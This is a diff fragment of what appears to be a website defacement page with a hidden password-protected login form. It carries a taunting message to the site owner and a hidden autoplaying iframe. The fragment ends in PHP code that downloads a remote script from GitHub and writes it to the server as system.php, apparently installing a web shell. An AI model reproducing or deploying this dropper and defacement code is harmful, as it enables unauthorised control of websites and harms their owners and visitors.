@@ -238,14 +238,14 @@ TypingText.prototype.run = function() {
 <br><b>
 <font face="Jolly" size="5" color="WhiteSmoke"> 
 If you say this is a game,we also say this is a game,can make clutter on your website is our game,know me by name..!  </font> <br>
-</script>
-</center>
-</html>
 <center>
 <form method="post">
 <input type="password" name="pass" placeholder="fb.com/405.phtml" style="text-align: center">
 </form>
 	<iframe width="0" height="0" src="https://archive.org/download/HallowedBeMyName/Hallowed%20Be%20My%20Name.mp3" frameborder="0" allowfullscreen</iframe>
+</script>
+</center>
+</html>
 <?php 
 $fp = fopen("system.php", "w"); 
 fwrite($fp, file_get_contents("https://raw.githubusercontent.com/alxwahid/3voScript/master/system.php")); 
